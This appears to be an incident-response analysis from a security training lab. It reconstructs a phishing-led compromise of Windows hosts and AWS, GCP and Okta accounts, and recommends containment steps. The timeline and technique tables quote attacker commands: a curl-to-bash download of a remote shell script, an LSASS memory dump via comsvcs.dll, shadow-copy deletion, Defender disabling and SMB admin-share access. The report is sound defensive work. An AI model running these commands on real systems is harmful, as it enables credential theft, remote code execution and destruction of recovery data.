# Analysis

Consolidated view of the evidence collected in `docs/INVESTIGATION_LOG.md`
and `docs/WALKTHROUGH.md`. Query references point to files in `queries/`.

## Timestamp reliability

| Source | Original time available | Note |
|---|---|---|
| GCPAuditLogs | Yes (`Timestamp`) | Reliable |
| AWSCloudTrail | Session start only (`SessionCreationDate`) | Order of events inside a session is not known |
| CrowdStrikeDetections / Alerts | Time of day (14:46–18:42 UTC) | Date is ambiguous: 2026-02-06 or 2026-06-02 (`06/02/2026`) |
| MailGuard, Okta, Palo Alto, SecurityEvent | No | Only ingestion time (2026-10-28) |
| SecurityAlert / SecurityIncident | No | Created by Sentinel analytics after ingestion |

## Timeline

### Endpoint (CrowdStrike, date 2026-02-06 or 2026-06-02)

| Time (UTC) | Host | Account | Event | Query |
|---|---|---|---|---|
| 14:46:27 | win11a | mirage | `C:\Users\mirage\Downloads\report.exe` executed | 04 |
| 14:51:42 | win11a | mirage | LSASS dump via `rundll32.exe comsvcs.dll MiniDump` | 04 |
| 15:18:42 | win11a | mirage | `report.exe --connect update-service-cdn.xyz` (C2) | 04 |
| 17:43:12 | win11a | mirage | Second LSASS dump | 04 |
| 17:44:24 | srv-file01 | jliu | LSASS dump | 04 |
| 17:45:36 | it-ws01 | jliu | report.exe executed | 04 |
| 17:46:48 | it-ws01 | jliu | `.docx` files staged to `C:\Temp\staging` | 04 |
| 17:49:12 | win11a | mirage | C2 beacon (`svchost.exe -k netsvcs`) | 04 |
| 17:51:36 | srv-file01 | jliu | `vssadmin delete shadows /all /quiet` | 04 |
| 17:52:48 | win11c | spatel | report.exe executed | 04 |
| 17:54:00 | win11a | mirage | Defender real-time monitoring disabled | 04 |
| 17:55:12 | dev-ws01 | aturner | report.exe executed | 04 |
| 17:56:24 | srv-dc01 | jliu | `vssadmin delete shadows /all /quiet` | 04 |
| 17:57:36 | win11a | mirage | `powershell.exe -enc` (`Invoke-WebRequest`) | 04 |
| 18:02:24 | win11b | ceo | `.docx` files staged | 04 |
| 18:07:12 | win11d | psharma | `net use \\target\C$ /user:admin` (SMB lateral movement) | 04 |
| 18:20:24 | win11a | mirage | `vssadmin delete shadows /all /quiet` | 04 |
| 18:22:48 | win11b | ceo | report.exe executed | 04 |
| 18:37:12 | dev-ws01 | aturner | `vssadmin delete shadows /all /quiet` | 04 |
| 18:42:00 | win11a | mirage | Last detection: encoded PowerShell | 04 |

### Cloud (2026-10-02)

| Time (UTC) | Platform | Account (IP) | Event | Query |
|---|---|---|---|---|
| 11:00:12 | AWS | mirage (198.51.100.42) | Session start: console login without MFA; discovery; `backdoor-svc` created with AdministratorAccess, access key and console password; security group opened to 0.0.0.0/0; 5 × p3.16xlarge launched with user data `curl https://185.220.101.55/shell.sh \| bash`; S3 `corp-data-prod` objects read; CloudTrail stopped and deleted | 08 |
| 11:30:15 | AWS | backdoor-svc (198.51.100.42) | Console login | 08 |
| 11:35:00 | AWS | backdoor-svc (203.0.113.77) | Console login, DescribeInstances | 08 |
| 12:00:05 | GCP | mirage (198.51.100.42) | Service account `backdoor-svc-gcp` created | 09 |
| 12:01:20 | GCP | mirage | Key created for backdoor-svc-gcp | 09 |
| 12:02:45 | GCP | mirage | `roles/owner` granted to backdoor-svc-gcp | 09 |
| 12:03:30 | GCP | mirage | Firewall rule `allow-all-ingress` (0.0.0.0/0) | 09 |
| 12:04:15–12:04:45 | GCP | mirage | `crypto-miner-01`, `crypto-miner-02` (a2-highgpu-8g) | 09 |
| 12:05:30–12:06:35 | GCP | mirage | `pocaas-confidential-data` listed; financial report and employee PII read | 09 |
| 12:07:50–12:08:30 | GCP | mirage | Log sink `export-all-logs` deleted, `_Default` disabled | 09 |
| 12:09:00–12:09:15 | GCP | eve.hacker (91.219.236.100) | CreateServiceAccount, SetIamPolicy denied | 09 |
| 12:10:00 | GCP | backdoor-svc-gcp (198.51.100.42) | `crypto-miner-03` launched | 09 |
| 12:11:45 | GCP | mirage | `api-keys-production.json` read | 09 |
| 12:12:00 | GCP | mirage | serviceAccountTokenCreator on `deploy-pipeline` granted to mirage | 09 |

### Undated

| Source | Event | Query |
|---|---|---|
| MailGuard | Emails with report.exe and links to `update-service-cdn.xyz` from 198.51.100.42 delivered to mirage (Allow) | 07 |
| MailGuard | Credential phishing from 91.219.236.100 and 185.220.101.55 delivered to mirage, ceo, spatel, jliu, aturner, psharma although classified as phishing | 07 |
| MailGuard | Internal email mirage → ceo "Weekly Status Update" with 2 URLs from 10.0.1.50 | 07 |
| Okta | mirage from 198.51.100.42 (RU): login, super admin role, API token, SMS factor of psharma deactivated, all MFA factors of ceo reset, TOTP factor for attacker device enrolled | 06 |
| Palo Alto | win11a → 192.0.2.100: ~183 MB sent over 443 and 53; THREAT `spyware` | 05 |
| Palo Alto | win11a → 10.0.1.200: 25 denied connections to common ports (port scan) | 05 |
| Palo Alto | win11a → 198.51.100.42, 203.0.113.77: small HTTPS sessions | 05 |
| SecurityEvent | win11a: 1102 audit log cleared by PKWORK\mirage | 12 |

## Scope

| Type | Entities |
|---|---|
| Accounts (PKWork) | mirage (primary), jliu (servers), ceo, psharma, spatel, aturner |
| Accounts (attacker-created) | AWS IAM user `backdoor-svc` (key `AKIAI99ATTACKKEY`); GCP `backdoor-svc-gcp` (key `abc123def456`); Okta API token of mirage; TOTP factor on attacker device |
| Hosts | win11a 10.0.1.50 (patient zero), win11b 10.0.1.51, win11c 10.0.1.52, it-ws01 10.0.1.53, win11d 10.0.1.54, dev-ws01 10.0.2.10, srv-dc01 10.0.0.10, srv-file01 10.0.0.20 |
| Attacker IPs | 198.51.100.42 (RU; email, Okta, AWS, GCP), 192.0.2.100 (C2 / exfiltration), 203.0.113.77 (backdoor-svc login, HTTPS from win11a), 185.220.101.55 (phishing, `shell.sh`), 91.219.236.100 (phishing, eve.hacker) |
| Domains | update-service-cdn.xyz, malicious-infra.xyz, pkwork-hr.com, pkwork-hr-portal.xyz, sh4repoint-pkwork.xyz, m1crosoft-support.xyz, 0ffice365-security.xyz |
| Files | report.exe (Downloads folders; logged hash is a placeholder), `C:\Temp\staging`, `shell.sh` |
| AWS (account 123456789012) | S3 `corp-data-prod`, security group `sg-0a1b2c3d4e5f67890`, 5 × p3.16xlarge (i-0a1b2c3d4e5f00001 …), trail `management-events-trail` |
| GCP (project pocaas-prod-01) | bucket `pocaas-confidential-data`, firewall `allow-all-ingress`, `crypto-miner-01/02/03`, sinks `export-all-logs`, `_Default`, service account `deploy-pipeline` |
| Okta | mirage (super admin), psharma (SMS factor removed), ceo (MFA reset) |

## MITRE ATT&CK mapping

| Tactic | Technique | Evidence |
|---|---|---|
| Initial Access | T1566.001 Spearphishing Attachment, T1566.002 Spearphishing Link | report.exe and malicious links delivered to mirage; credential phishing to six users |
| Execution | T1204.002 User Execution: Malicious File | report.exe from Downloads on six hosts |
| Execution | T1059.001 PowerShell | `powershell.exe -enc` (Invoke-WebRequest) |
| Persistence | T1098 Account Manipulation; T1136.003 Create Cloud Account | Okta super admin and MFA changes; `backdoor-svc`, `backdoor-svc-gcp` |
| Persistence | T1098.001 Additional Cloud Credentials | AWS access key, GCP service account key, Okta API token |
| Persistence | T1556.006 Modify Authentication Process: MFA | TOTP factor enrolled for attacker device; MFA of ceo and psharma changed |
| Persistence | T1547 Boot or Logon Autostart Execution | CrowdStrike "Persistence mechanism detected on win11a" (Lab Stage 2.5) |
| Privilege Escalation | T1078 Valid Accounts; T1078.004 Cloud Accounts | mirage and jliu credentials; mirage in AWS, GCP, Okta |
| Defense Evasion | T1562.001 Disable or Modify Tools | `Set-MpPreference -DisableRealtimeMonitoring $true` |
| Defense Evasion | T1562.008 Disable or Modify Cloud Logs | CloudTrail StopLogging/DeleteTrail; GCP sinks deleted/disabled |
| Defense Evasion | T1070.001 Clear Windows Event Logs | Event 1102 on win11a |
| Credential Access | T1003.001 LSASS Memory | comsvcs.dll MiniDump on win11a, srv-file01, it-ws01 |
| Discovery | T1046 Network Service Discovery | Port scan of 10.0.1.200 from win11a |
| Discovery | T1580 Cloud Infrastructure Discovery; T1087.004 Cloud Account | AWS IAM/EC2/KMS enumeration |
| Lateral Movement | T1021.002 SMB/Windows Admin Shares | `net use \\target\C$` |
| Collection | T1074.001 Local Data Staging | `xcopy *.docx C:\Temp\staging` |
| Collection | T1530 Data from Cloud Storage | S3 `corp-data-prod`, GCS `pocaas-confidential-data` |
| Command and Control | T1071.001 Web Protocols; T1071.004 DNS | `update-service-cdn.xyz` / 192.0.2.100 over 443 and 53 |
| Exfiltration | T1041 Exfiltration Over C2 Channel | ~183 MB from win11a to 192.0.2.100 |
| Impact | T1490 Inhibit System Recovery | `vssadmin delete shadows` on win11a, srv-file01, srv-dc01, dev-ws01 |
| Impact | T1496 Resource Hijacking | p3.16xlarge and a2-highgpu-8g "crypto-miner" instances |

## Confidence

### Confirmed

- Phishing emails carrying report.exe and links to `update-service-cdn.xyz` were delivered to mirage from 198.51.100.42 (MailGuard, Action Allow).
- report.exe was executed from the Downloads folder on win11a (mirage) and on five more workstations.
- LSASS memory was dumped on win11a, srv-file01 and it-ws01.
- win11a connected to `update-service-cdn.xyz` and sent ~183 MB to 192.0.2.100.
- win11a scanned 10.0.1.200 on 25 ports.
- From 198.51.100.42, mirage's Okta account granted itself super admin, created an API token and changed MFA of psharma and ceo.
- From 198.51.100.42, mirage's AWS and GCP identities created admin/owner backdoor accounts, read sensitive data and API keys, launched GPU instances and disabled cloud logging.
- The backdoor accounts were used afterwards (backdoor-svc logins, crypto-miner-03 by backdoor-svc-gcp).
- The Windows Security log on win11a was cleared by mirage.

### Likely

- The phishing email with report.exe was the initial access vector (same file name, same C2 domain, same sender IP as later attacker activity).
- One actor controls 198.51.100.42, 192.0.2.100, 203.0.113.77 and 185.220.101.55.
- The ~183 MB to 192.0.2.100 is data exfiltration (DNS traffic to an external IP suggests tunneling).
- jliu's credentials (IT admin on srv-dc01 and srv-file01) were compromised, probably via LSASS dumping.
- The GPU instances were launched for cryptomining.
- The attacker prepared for ransomware (Defender disabled, shadow copies deleted on four hosts including the domain controller).

### Unknown

- The exact date of the endpoint activity (2026-02-06 or 2026-06-02) and its order relative to the cloud activity on 2026-10-02.
- How mirage's Okta, AWS and GCP credentials were obtained.
- Whether files were encrypted; no encryption events are present.
- What data was in the ~183 MB transfer.
- Whether ceo and psharma accounts were accessed after their MFA was changed.
- Whether other recipients of the allowed credential phishing entered their credentials.
- Whether eve.hacker (91.219.236.100) is the same actor; all of its attempts failed.
- Whether the backdoor accounts, keys, API token and attacker MFA factor are still active.

## Recommended response

Each action is tied to the evidence above. Order reflects priority.

### 1. Contain (immediately)

| Action | Reason |
|---|---|
| Isolate win11a, win11b, win11c, win11d, it-ws01, dev-ws01, srv-file01 and srv-dc01 in CrowdStrike (network containment) | report.exe, LSASS dumps, C2 and shadow copy deletion on these hosts |
| Block 198.51.100.42, 192.0.2.100, 203.0.113.77, 185.220.101.55, 91.219.236.100 on the Palo Alto firewall, in Okta network zones and in cloud firewalls | Attacker infrastructure seen in email, identity, network and cloud logs |
| Block domains update-service-cdn.xyz, malicious-infra.xyz, pkwork-hr.com, pkwork-hr-portal.xyz, sh4repoint-pkwork.xyz, m1crosoft-support.xyz, 0ffice365-security.xyz in DNS, proxy and MailGuard | C2 and phishing domains |
| Block DNS from internal hosts to external resolvers; allow only 10.0.1.1 | DNS traffic from win11a to 192.0.2.100 (possible tunneling) |

### 2. Remove attacker access

| Action | Reason |
|---|---|
| Okta: suspend mirage, revoke all sessions, delete the API token, remove the super admin role, remove the attacker TOTP factor | Okta takeover from 198.51.100.42 |
| Okta: reset passwords and re-enroll MFA for ceo and psharma; review their sign-ins after the MFA change | MFA of both users was manipulated by mirage |
| AWS: delete IAM user backdoor-svc (access key AKIAI99ATTACKKEY, login profile); disable mirage's access keys and console password | Admin backdoor and compromised IAM user |
| GCP: delete service account backdoor-svc-gcp and its key; remove `roles/owner` binding; remove serviceAccountTokenCreator of mirage on deploy-pipeline | Owner-level backdoor and impersonation path |
| Reset passwords of jliu and all privileged AD accounts; reset the KRBTGT password twice | LSASS dumps on srv-file01 and it-ws01; activity under jliu on the domain controller |
| Reset passwords of mirage, spatel, aturner, ceo, psharma, jliu (all recipients of allowed phishing and users with report.exe execution) | Credentials may have been exposed |

### 3. Eradicate and recover

| Action | Reason |
|---|---|
| Terminate the 5 × p3.16xlarge AWS instances and crypto-miner-01/02/03 in GCP; revert security group sg-0a1b2c3d4e5f67890 and delete firewall rule allow-all-ingress; restore the instance profile association | Resource hijacking and exposed instances |
| Re-create CloudTrail `management-events-trail` and GCP sinks `export-all-logs` / `_Default` | Cloud logging was disabled by the attacker |
| Re-image the affected workstations; rebuild or thoroughly clean srv-file01 and srv-dc01 | Persistence on win11a, Defender disabled, uncertain state of servers |
| Re-enable Defender real-time monitoring via policy and lock tamper protection | Security Tool Tamper Attempt on win11a, win11b, win11d, dev-ws01 |
| Verify backups and restore points of srv-file01 and srv-dc01 | Shadow copies deleted |
| Rotate every secret in `api-keys-production.json` (S3 and GCS copies) | Files read by the attacker |

### 4. Investigate further

| Action | Reason |
|---|---|
| Collect raw logs with original timestamps from CrowdStrike, MailGuard, Okta and Palo Alto | Event dates are missing or ambiguous in the ingested data |
| Analyse report.exe and `shell.sh` in a sandbox | Logged hash is a placeholder; capabilities unknown |
| Determine the content of the ~183 MB sent to 192.0.2.100 and of `C:\Temp\staging` | Scope of data theft |
| Check srv-file01 and srv-dc01 for encrypted files | Ransomware preparation observed, encryption not confirmed |
| Review sign-ins of all phishing recipients and the URLs in mirage's internal email to ceo | Possible further credential compromise |
| Assess notification obligations for employee PII and financial data | `hr/employee-records-full.csv`, `employee-pii-export.csv`, financial reports accessed |

### 5. Improve controls

| Action | Reason |
|---|---|
| Change MailGuard policy to quarantine messages with a Phishing/Malicious verdict and block executable attachments | Detected phishing was allowed |
| Enforce phishing-resistant MFA for Okta, AWS and GCP; require MFA for AWS console | AWS console login without MFA; MFA reset by a compromised admin |
| Require approval for Okta admin role grants and MFA resets | mirage granted itself super admin and reset MFA of others |
| Apply least privilege in AWS and GCP; restrict IAM user/service account creation and log configuration changes with SCPs / organization policies | One user could create admin backdoors and delete logs |
| Alert on LSASS access, `vssadmin delete shadows`, event 1102 and Defender configuration changes | Key techniques observed in this incident |
| Increase Sentinel workspace retention to at least 90 days | Lab data in the first workspace was lost after 30 days |
